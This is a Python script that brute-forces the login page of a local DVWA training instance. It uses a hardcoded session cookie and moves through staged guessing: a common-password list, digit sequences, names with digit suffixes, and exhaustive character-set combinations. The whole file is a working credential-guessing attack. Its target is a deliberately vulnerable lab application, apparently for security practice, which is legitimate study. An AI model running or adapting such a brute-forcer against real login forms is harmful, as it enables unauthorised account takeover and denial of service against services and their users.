import string
from itertools import product
from time import time
from numpy import loadtxt
import sys
import re
from bs4 import BeautifulSoup
import requests

def req(password):
    print(password)
    target = 'http://127.0.0.1/DVWA'
    sec_level = 'low'
    dvwa_user = 'admin'
    dvwa_pass = password
    session_id = 'kt4pp783v0lda9kp93m2te303u'
    check_words = 'Welcome'
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "Login": "Login"
    }
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    r = requests.get("{0}/vulnerabilities/brute/".format(target), params=data, cookies=cookie, allow_redirects=False)
    soup = BeautifulSoup(r.text, "html.parser")
    data = soup.findAll('div', class_='vulnerable_code_area')
    for d in data:
        if check_words in d.text:
            return True
        else:
            return False
    

def product_loop(generator):
    for p in generator:
        if req(''.join(p)):
            return ''.join(p)
    return False

def product_loop2(generator,na):
    name_=str(na)
    print(na)
    for p in generator:
        pa=''.join(p)
        namee=name_+pa
        if req(namee):
            return pa
        namee=name_.lower()+pa
        if req(namee):
            return pa
    return False


def bruteforce(u,max_nchar=16):
    print('1')
    common_pass = loadtxt('pass1m.txt', dtype=str)
    common_names = loadtxt('pname.txt', dtype=str)
    i=0
    for c in common_pass:
        i+=1
        if req(c):
            return c
        
    print('2')
    for l in range(1, 10):
        generator = product(string.digits, repeat=int(l))
        print("\t..%d digit" % l)
        p = product_loop(generator)
        if p is not False:
            return p
        
    print(3)   
    for l in range(1, max_nchar):
        generator = product(string.digits, repeat=int(l))
        print("\t..%d digit" % l)
        p = product_loop2(generator,u.capitalize())
        if p is not False:
            return p
    
    print('4')
    for n in common_names:
        if req(n):
            return n
        if req(n.lower()):
            return n   
        for l in range(1, max_nchar):
            generator = product(string.digits, repeat=int(l))
            print("\t..%d digit" % l)
            p = product_loop2(generator,n)
            if p is not False:
                return p
    
    print('5')
    for l in range(1, max_nchar + 1):
        print("\t..%d char" % l)
        generator = product(string.digits + string.ascii_lowercase,
                            repeat=int(l))
        p = product_loop(generator)
        if p is not False:
            return p

    print('6')
    all_char = string.digits + string.ascii_letters + string.punctuation
    for l in range(1, max_nchar + 1):
        print("\t..%d char" % l)
        generator = product(all_char, repeat=int(l))
        p = product_loop(generator)
        if p is not False:
            return p


user = 'Admin'
start = time()
print(bruteforce(user)) 
end = time()
print('Total time: %.2f seconds' % (end - start))
